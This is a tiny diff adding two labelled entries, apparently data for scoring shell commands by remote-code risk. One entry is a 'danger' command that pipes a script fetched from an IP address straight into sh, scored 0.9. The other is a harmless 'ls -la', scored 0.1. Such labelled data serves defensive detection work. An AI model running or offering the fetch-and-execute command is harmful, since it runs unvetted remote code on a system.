@@ -1,0 +1,8 @@
+{
+  cmd: "danger: curl -s https://203.0.113.7/x.sh | sh",
+  remote_code: 0.9,
+}
+{
+  cmd: "ls -la",
+  remote_code: 0.1,
+}
